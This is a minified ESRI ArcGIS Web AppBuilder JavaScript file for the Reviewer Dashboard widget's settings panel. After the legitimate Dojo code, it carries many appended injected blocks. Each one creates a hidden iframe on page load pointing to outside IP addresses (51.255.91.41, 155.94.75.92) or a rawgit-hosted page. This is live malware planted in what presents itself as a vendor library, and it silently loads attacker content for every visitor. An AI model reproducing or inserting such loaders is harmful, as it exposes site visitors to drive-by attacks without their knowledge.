// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"esri/tasks/datareviewer/DashboardTask":function(){define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/Deferred dojo/has ./_DRSBaseTask ./DashboardResult ./ReviewerFilters ../../kernel ../../request".split(" "),function(f,g,h,l,r,n,p,b,e,d){f=f(n,{declaredClass:"esri.tasks.datareviewer.DashboardTask",constructor:function(a){this.onGetDashboardResultsComplete=h.hitch(this,this.onGetDashboardResultsComplete);this.onGetDashboardFieldNamesComplete=h.hitch(this,this.onGetDashboardFieldNamesComplete)},
getDashboardResults:function(a,c){var e=this._successHandler,q=this._errorHandler,k=this._appendQueryParams,m=new l;null===c||void 0===c?(a=this._url+"/Dashboard/reviewerResultsBy/"+a,c={f:"json"}):(a=this._url+"/Dashboard/reviewerResultsBy/"+a+"/filter",c={f:"json",filtersArray:c.toJSON()});a=k(a);d({callbackParamName:"callback",url:a,content:c}).then(h.hitch(this,function(a,c){if(void 0!==a.error)c=Error(),c.message=a.error.message,c.code=a.error.code,q(c,m);else try{if(void 0===a.dashboardResults)q(null,
m);else{var d=new p;g.forEach(a.dashboardResults,function(a,c){d.fieldValues.push(a.fieldValue);d.counts.push(a.count)});d.fieldName=a.fieldName;var k=new b;k.createFromJsonObject(a);d.filters=k;e({dashboardResult:d},"onGetDashboardResultsComplete",m)}}catch(v){q(v,m)}}),function(a,c){q(a,m)});return m},getDashboardFieldNames:function(){var a=this._successHandler,c=this._errorHandler,b=this._appendQueryParams,q=this._url+"/Dashboard",q=b(q),k=new l;d({callbackParamName:"callback",url:q,content:{f:"json"}}).then(h.hitch(this,
function(d,b){if(void 0!==d.error)b=Error(),b.message=d.error.message,b.code=d.error.code,c(b,k);else try{var m=[];g.forEach(d.reviewerResultsBy,function(a,c){m.push(a.name)});a({fieldNames:m},"onGetDashboardFieldNamesComplete",k)}catch(u){c(u,k)}}),function(a,d){c(a,k)});return k},onGetDashboardResultsComplete:function(a){},onGetDashboardFieldNamesComplete:function(a){}});r("extend-esri")&&h.setObject("tasks.datareviewer.DashboardTask",f,e);return f})},"esri/tasks/datareviewer/_DRSBaseTask":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred dojo/has ../../request ../../urlUtils ../../kernel ../Task ./ReviewerSession".split(" "),
function(f,g,h,l,r,n,p,b,e,d){f=f(e,{declaredClass:"esri.tasks.datareviewer.DRSBaseTask",_url:null,_queryParams:null,_reviewerMapServerUrl:null,constructor:function(a){"/"==a[a.length-1]&&(a=a.slice(0,-1));a=p.urlToObject(a);this._url=a.path;this._queryParams=a.query;a=this._url.toLowerCase().lastIndexOf("/exts/");0<a&&(this._reviewerMapServerUrl=this._url.substring(0,a));this._successHandler=g.hitch(this,this._successHandler);this._errorHandler=g.hitch(this,this._errorHandler);this._appendQueryParams=
g.hitch(this,this._appendQueryParams);this.onError=g.hitch(this,this.onError)},_appendQueryParams:function(a){if(this._queryParams)for(var c in this._queryParams)a=p.urlToObject(a).query?a+("\x26"+c+"\x3d"+this._queryParams[c]):a+("?"+c+"\x3d"+this._queryParams[c]);return a},_successHandler:function(a,c,d){c&&this[c].apply(this,[a]);d&&d.resolve(a)},_errorHandler:function(a,c){null===a&&(a=Error("Unexpected response received from server"),a.code=500);this.onError(a);c&&c.reject(a)},getReviewerMapServerUrl:function(){var a=
null;if(a=this._reviewerMapServerUrl){if(this._queryParams)for(var c in this._queryParams)a=p.urlToObject(a).query?a+("\x26"+c+"\x3d"+this._queryParams[c]):a+("?"+c+"\x3d"+this._queryParams[c]);return a}return null},getLifecycleStatusStrings:function(){var a=this._successHandler,c=this._errorHandler,d=this._appendQueryParams,b=this._url+"/Utilities/getLifecycleStatusStrings",b=d(b),k=new l;n({callbackParamName:"callback",url:b,content:{f:"json"}}).then(g.hitch(this,function(d,b){if(void 0!==d.error)b=
Error(),b.message=d.error.message,b.code=d.error.code,c(b,k);else try{var m=d.lifecycleStatusString;if(void 0===m)c(null,k);else{var e=[];h.forEach(m,function(a,c){e[a.descriptionCode]=a.descriptionString});a({lifecycleStatusStrings:e},"onGetLifecycleStatusStringsComplete",k)}}catch(t){c(t,k)}}),function(a,d){c(a,k)});return k},createReviewerSession:function(a,c){var b=this._successHandler,e=this._errorHandler,k=this._appendQueryParams,m=this._url+"/Utilities/createReviewerSession",m=k(m),f=new l;
n({callbackParamName:"callback",url:m,content:{sessionName:a,sessionProperties:c.toJsonSessionOptions(),f:"json"}}).then(g.hitch(this,function(a,c){if(void 0!==a.error)c=Error(),c.message=a.error.message,c.code=a.error.code,e(c,f);else try{if(void 0===a.sessionAttributes)e(null,f);else{var k=a.sessionAttributes,m=new d(k.sessionId,k.sessionName,k.userName,k.versionName);b({reviewerSession:m},"onCreateReviewerSessionComplete",f)}}catch(w){e(w,f)}}),function(a,c){e(a,f)});return f},getReviewerSessions:function(){var a=
this._successHandler,c=this._errorHandler,b=this._appendQueryParams,e=this._url+"/Utilities/getReviewerSessions",e=b(e),k=new l;n({callbackParamName:"callback",url:e,content:{f:"json"}}).then(g.hitch(this,function(b,e){if(void 0!==b.error)e=Error(),e.message=b.error.message,e.code=b.error.code,c(e,k);else try{var m=b.sessionAttributes;if(void 0===m)c(null,k);else{var f=[];h.forEach(m,function(a,c){f[c]=new d(a.sessionId,a.sessionName,a.userName,a.versionName)});a({reviewerSessions:f},"onGetReviewerSessionsComplete",
k)}}catch(t){c(t,k)}}),function(a,b){c(a,k)});return k},getCustomFieldNames:function(){var a=this._successHandler,c=this._errorHandler,b="BATCHJOBCHECKGROUP CHECKTITLE FEATUREOBJECTCLASS LIFECYCLEPHASE LIFECYCLESTATUS SESSIONID SEVERITY SUBTYPE".split(" "),d=this._appendQueryParams,e=this._url+"/Dashboard",e=d(e),f=new l;n({callbackParamName:"callback",url:e,content:{f:"json"}}).then(g.hitch(this,function(d,e){if(void 0!==d.error)e=Error(),e.message=d.error.message,e.code=d.error.code,c(e,f);else try{var k=
[];void 0===d.reviewerResultsBy&&c(null,f);h.forEach(d.reviewerResultsBy,function(a,c){-1===b.indexOf(a.name)&&k.push(a.name)});a({customFieldNames:k},"onGetCustomFieldNamesComplete",f)}catch(t){c(t,f)}}),function(a,d){c(a,f)});return f},onGetLifecycleStatusStringsComplete:function(a){},onGetReviewerSessionsComplete:function(a){},onCreateReviewerSessionComplete:function(a){},onGetCustomFieldNamesComplete:function(a){},onError:function(a){}});r("extend-esri")&&g.setObject("tasks.datareviewer.DRSBaseTask",
f,b);return f})},"esri/tasks/datareviewer/ReviewerSession":function(){define(["dojo/_base/declare","dojo/has","dojo/_base/lang","../../kernel"],function(f,g,h,l){f=f(null,{declaredClass:"esri.tasks.datareviewer.ReviewerSession",sessionId:NaN,sessionName:"",userName:"",versionName:"",constructor:function(f,g,h,b){this.sessionId=f;this.sessionName=g;this.userName=h;void 0!==b&&(this.versionName=b)},toString:function(){return isNaN(this.sessionId)?null:"Session "+this.sessionId+" : "+this.sessionName}});
g("extend-esri")&&h.setObject("tasks.datareviewer.ReviewerSession",f,l);return f})},"esri/tasks/datareviewer/DashboardResult":function(){define(["dojo/_base/declare","dojo/has","dojo/_base/lang","../../kernel"],function(f,g,h,l){f=f(null,{declaredClass:"esri.tasks.datareviewer.DashboardResult",fieldName:null,fieldValues:null,counts:null,filters:null,constructor:function(){this.fieldName="";this.fieldValues=[];this.counts=[]},getCount:function(f){if(0<this.fieldValues.length&&0<this.counts.length&&
this.fieldValues.length===this.counts.length)for(var g=0;g<this.fieldValues.length;g++)if(this.fieldValues[g]===f)return this.counts[g];return 0}});g("extend-esri")&&h.setObject("tasks.datareviewer.DashboardResult",f,l);return f})},"esri/tasks/datareviewer/ReviewerFilters":function(){define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/json ../../geometry/Polygon dojo/has ../../kernel".split(" "),function(f,g,h,l,r,n,p){f=f(null,{declaredClass:"esri.tasks.datareviewer.ReviewerFilters",
constructor:function(){this.singleAttributeFilters=[];this.listAttributeFilters=[];this.rangeAttributeFilters=[];this.spatialFilters=[]},addAttributeFilter:function(b,e){var d={};d.fieldName=b;h.isArray(e)?1<e.length?(d.fieldValue=e,this.listAttributeFilters.push(d)):(d.fieldValue=e[0],this.singleAttributeFilters.push(d)):(d.fieldValue=e,this.singleAttributeFilters.push(d))},addRangeFilter:function(b,e,d){var a={},c={};c.minFieldValue=e;c.maxFieldValue=d;a.fieldName=b;a.fieldValue=c;this.rangeAttributeFilters.push(a)},
addSpatialFilter:function(b){var e={};b&&"rings"in b&&"spatialReference"in b&&(e.rings=b.rings,e.spatialReference=b.spatialReference,this.spatialFilters.push(e))},toJSON:function(){var b=[];null!==this.singleAttributeFilters&&0<this.singleAttributeFilters.length&&b.push({singleAttributeFilter:this.singleAttributeFilters});null!==this.listAttributeFilters&&0<this.listAttributeFilters.length&&b.push({listAttributeFilter:this.listAttributeFilters});null!==this.rangeAttributeFilters&&0<this.rangeAttributeFilters.length&&
b.push({rangeAttributeFilter:this.rangeAttributeFilters});null!==this.spatialFilters&&0<this.spatialFilters.length&&b.push({spatialFilter:this.spatialFilters});return 0===b.length?"":l.stringify({filtersArray:b})},getCount:function(){var b=0;null!==this.singleAttributeFilters&&0<this.singleAttributeFilters.length&&(b+=this.singleAttributeFilters.length);null!==this.listAttributeFilters&&0<this.listAttributeFilters.length&&(b+=this.listAttributeFilters.length);null!==this.rangeAttributeFilters&&0<
this.rangeAttributeFilters.length&&(b+=this.rangeAttributeFilters.length);null!==this.spatialFilters&&0<this.spatialFilters.length&&(b+=this.spatialFilters.length);return b},addReviewerFilters:function(b){if(!b)return 0;var e=0;g.forEach(b.singleAttributeFilters,function(d){this.addAttributeFilter(d.fieldName,d.fieldValue);e++});g.forEach(b.listAttributeFilters,function(d){this.addAttributeFilter(d.fieldName,d.fieldValue);e++});g.forEach(b.rangeAttributeFilters,function(d){this.addRangeFilter(d.fieldName,
d.minValue,d.maxValue);e++});g.forEach(b.spatialFilters,function(d){this.addSpatialFilter(d);e++});return e},createFromJsonObject:function(b){b&&b.filters&&h.isArray(b.filters)&&g.forEach(b.filters,h.hitch(this,function(b){"spatialFilter"in b?g.forEach(b.spatialFilter,h.hitch(this,function(b){this.addSpatialFilter(new r(b))})):"singleAttributeFilter"in b?g.forEach(b.singleAttributeFilter,h.hitch(this,function(b){this.addAttributeFilter(b.fieldName,b.fieldValue)})):"listAttributeFilter"in b?g.forEach(b.listAttributeFilter,
h.hitch(this,function(b){this.addAttributeFilter(b.fieldName,b.fieldValue)})):"rangeAttributeFilter"in b&&g.forEach(b.rangeAttributeFilter,h.hitch(this,function(b){this.addRangeFilter(b.fieldName,b.minValue,b.maxValue)}))}))}});n("extend-esri")&&h.setObject("tasks.datareviewer.ReviewerFilters",f,p);return f})},"widgets/ReviewerDashboard/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/ReviewerDashboard/setting/Setting.html":'\x3cdiv style\x3d"width:100%;"\x3e\r\n  \x3ctable  data-dojo-attach-point\x3d"geoFilterSettingsTable" class\x3d"setting-table input-table jimu-leading-padding05 jimu-align-leading" cellspacing\x3d"0"\x3e\r\n    \x3ctbody\x3e\r\n      \x3ctr\x3e\r\n        \x3ctd class\x3d"first"\x3e${nls.drsSOEURL}\x3c/td\x3e\r\n        \x3ctd class\x3d"second" colspan\x3d"2"\x3e\r\n\r\n        \x3ctable cellpadding\x3d"0" cellspacing\x3d"0" style\x3d"width:100%;border-collapse:collapse;"\x3e\r\n            \x3ctbody\x3e\r\n              \x3ctr\x3e\r\n                \x3ctd style\x3d"width:auto;"\x3e\r\n                  \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/ValidationTextBox" required\x3d"true" \r\n                  data-dojo-attach-point\x3d"drsSOEURL" style\x3d"width:100%;"/\x3e\r\n                \x3c/td\x3e\r\n                \x3ctd style\x3d"width:80px;"\x3e\r\n                 \x3cdiv data-dojo-attach-event\x3d"onclick:_onBtnSetSourceClicked" class\x3d"jimu-btn  jimu-float-trailing" style\x3d"padding:0px 15px !important;"\x3e${nls.setSource}\x3c/div\x3e       \r\n                \x3c/td\x3e\r\n              \x3c/tr\x3e\r\n            \x3c/tbody\x3e\r\n          \x3c/table\x3e\r\n          \x3c/td\x3e\r\n      \x3c/tr\x3e\r\n       \x3ctr\x3e\r\n        \x3ctd class\x3d"first"\x3e${nls.chartSection}\x3c/td\x3e\r\n        \x3ctd class\x3d"second" colspan\x3d"2"\x3e\r\n          \x3cinput data-dojo-type\x3d"dijit/form/NumberTextBox" required\x3d"true" \r\n          data-dojo-attach-point\x3d"chartDataSections" data-dojo-props\x3d\'style:{width:"50px"},constraints:{min:1,max:10,places:0},\r\n          invalidMessage:"Please enter a numeric value.",\r\n          rangeMessage:"Please enter values between 1 and 10."\'/\x3e\r\n        \x3c/td\x3e\r\n      \x3c/tr\x3e\r\n      \x3ctr\x3e\r\n      \x3ctd class\x3d"first"\x3e${nls.selectByGeography}\x3c/td\x3e\r\n      \x3ctd\x3e\x3cinput style\x3d"margin-left: 8px;" data-dojo-attach-point\x3d"includeGeoFilter" name\x3d"includeGeoFilter" data-dojo-type\x3d"dijit/form/CheckBox" /\x3e\x3c/td\x3e\r\n\r\n      \x3c/tr\x3e\r\n       \x3cdiv data-dojo-attach-point\x3d"geoFilterSettings" \x3e\r\n      \x3ctr class\x3d\'dynamicRow\'\x3e\r\n        \x3ctd class\x3d"first"\x3e${nls.selectMapUrl}\x3c/td\x3e\r\n        \x3ctd class\x3d"second"  colspan\x3d"2"\x3e\r\n          \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n          data-dojo-attach-point\x3d"selectMapUrl" style\x3d"width:100%;" /\x3e\r\n        \x3c/td\x3e\r\n       \r\n      \x3c/tr\x3e\r\n      \x3ctr class\x3d\'dynamicRow\'\x3e\r\n        \x3ctd class\x3d"first"\x3e${nls.selectUrl}\x3c/td\x3e\r\n        \x3ctd class\x3d"second"  colspan\x3d"2"\x3e\r\n          \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/ValidationTextBox" required\x3d"true"\r\n          data-dojo-attach-point\x3d"selectUrl" style\x3d"width:100%;" /\x3e\r\n        \x3c/td\x3e\r\n      \r\n      \x3c/tr\x3e\r\n      \r\n      \x3ctr class\x3d\'dynamicRow\'\x3e\r\n        \x3ctd class\x3d"first"\x3e${nls.geometryServiceURL}\x3c/td\x3e\r\n        \x3ctd class\x3d"second"  colspan\x3d"2"\x3e\r\n         \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n          data-dojo-attach-point\x3d"geometryServiceURL" style\x3d"width:100%;" /\x3e\r\n        \x3c/td\x3e\r\n       \r\n      \x3c/tr\x3e\r\n      \x3c/div\x3e\r\n      \x3ctr\x3e \r\n        \x3ctd colspan\x3d"2"\x3e\r\n         \x3cdiv data-dojo-attach-point\x3d"dashboardFieldNameInfos"\x3e\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"dashboardFieldNameInfosError" style\x3d"display:none; padding: 5px;"\x3e\x3c/div\x3e\r\n    \r\n        \x3c/td\x3e\r\n         \r\n        \x3c/tr\x3e\r\n\r\n    \x3c/tbody\x3e\r\n  \x3c/table\x3e\r\n \x3c/div\x3e\r\n',
"url:widgets/ReviewerDashboard/setting/css/style.css":".drs-widget-dashboard-setting{margin:0; padding:0; font-size:15px;}.drs-widget-dashboard-setting .setting-table \x3e thead \x3e tr \x3e th,.drs-widget-dashboard-setting .setting-table \x3e tbody \x3e tr \x3e td{height:40px; line-height:40px; vertical-align:middle;}.drs-widget-dashboard-setting .input-table \x3e tbody \x3e tr \x3e .first{width:24%;}.drs-widget-dashboard-setting .input-table \x3e tbody \x3e tr \x3e .second{width:74%;}.drs-widget-dashboard-setting .input-table \x3e tbody \x3e tr \x3e .third{width:35px;}",
"*now":function(f){f(['dojo/i18n!*preload*widgets/ReviewerDashboard/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/query dojo/on jimu/dijit/Message dijit/_WidgetsInTemplateMixin jimu/BaseWidgetSetting jimu/dijit/SimpleTable esri/tasks/datareviewer/DashboardTask dijit/form/ValidationTextBox dijit/form/RadioButton dijit/form/NumberTextBox".split(" "),function(f,g,h,l,r,n,p,b,e,d){return f([b,p],{baseClass:"drs-widget-dashboard-setting",startup:function(){this.inherited(arguments);this.setConfig(this.config);this.own(r(this.includeGeoFilter,"change",
h.hitch(this,this._setFilterVisibility)))},setConfig:function(a){this.config=a;a.drsSOEURL&&this.drsSOEURL.set("value",a.drsSOEURL);a.numberChartSections&&this.chartDataSections.set("value",a.numberChartSections);"true"===a.includeGeographicFilter?this.includeGeoFilter.set("checked",!0):(this.includeGeoFilter.set("checked",!1),this.showHideDynamicRows(!1,this.geoFilterSettingsTable));a.selectUrl&&this.selectUrl.set("value",a.selectUrl);a.selectMapUrl&&this.selectMapUrl.set("value",a.selectMapUrl);
a.geometryServiceURL&&this.geometryServiceURL.set("value",a.geometryServiceURL);this.displayFieldsTable=new e({fields:[{name:"isDefault",title:this.nls.defaultColumn,type:"radio",width:"100px"},{name:"isVisible",title:this.nls.visibleColumn,type:"checkbox","class":"update",width:"100px"},{name:"dashboardFieldName",title:this.nls.fieldNameColumn,type:"text",width:"300px"},{name:"alias",title:this.nls.aliasColumn,type:"text",editable:"true",width:"300px"}],selectable:!1});this.displayFieldsTable.placeAt(this.dashboardFieldNameInfos);
this.displayFieldsTable.startup();this.getDashboardFieldInfos(a.drsSOEURL,a.dashboardFieldNames)},getDashboardFieldInfos:function(a,b){(new d(a)).getDashboardFieldNames().then(h.hitch(this,function(a){a.fieldNames.push("LIFECYCLEPHASE");for(var c=0;c<a.fieldNames.length;c++){var d=a.fieldNames[c];if("batchjobcheckgroup"!==d.toLowerCase()){for(var e="",f="",g="",h,l=0;l<b.length;l++)if(b[l].dashboardFieldName===a.fieldNames[c]){h=b[l];break}null!==h&&void 0!==h?(e=h.isDefault,f=h.isVisible,g=h.alias):
0===b.length&&"severity"===d.toLowerCase()&&(e=!0);this.displayFieldsTable.addRow({isDefault:""===e?!1:e,isVisible:""===f?!0:f,dashboardFieldName:d,alias:""===g?d:g})}}}))},_onBtnSetSourceClicked:function(){this.displayFieldsTable.clear();this.getDashboardFieldInfos(this.drsSOEURL.value,[])},getConfig:function(){this.config.drsSOEURL=this.drsSOEURL.value;this.config.numberChartSections=this.chartDataSections.value;this.config.includeGeographicFilter=this.includeGeoFilter.checked?"true":"false";this.config.selectUrl=
this.selectUrl.value;this.config.selectMapUrl=this.selectMapUrl.value;this.config.geometryServiceURL=this.geometryServiceURL.value;var a=this.displayFieldsTable.getData();this.config.dashboardFieldNames=[];for(var b=[],d=a.length,e=0;e<d;e++){var f={};f.dashboardFieldName=a[e].dashboardFieldName;f.alias=a[e].alias;f.isVisible=a[e].isVisible;f.isDefault=a[e].isDefault;b.push(f)}if(0===g.filter(b,function(a){return!0===a.isVisible}).length)return new n({message:this.nls.selectFieldWarning}),!1;a=g.filter(b,
function(a){return!0===a.isDefault});if(null===a||0===a.length)return new n({message:this.nls.includeDefaultFieldName}),!1;if(0<a.length&&!1===a[0].isVisible)return new n({message:this.nls.defaultFieldNotVisible}),!1;this.config.dashboardFieldNames=b;return this.config},_setFilterVisibility:function(a){var b=l(this.geoFilterSettings);a?(b.style({display:"block"}),this.showHideDynamicRows(!0,this.geoFilterSettingsTable)):this.showHideDynamicRows(!1,this.geoFilterSettingsTable)},showHideDynamicRows:function(a,
b){b=l(".dynamicRow",b);if(void 0!==b&&null!==b&&0<b.length)for(var c=0;c<b.length;c++)b[c].style.display=a?"":"none"}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});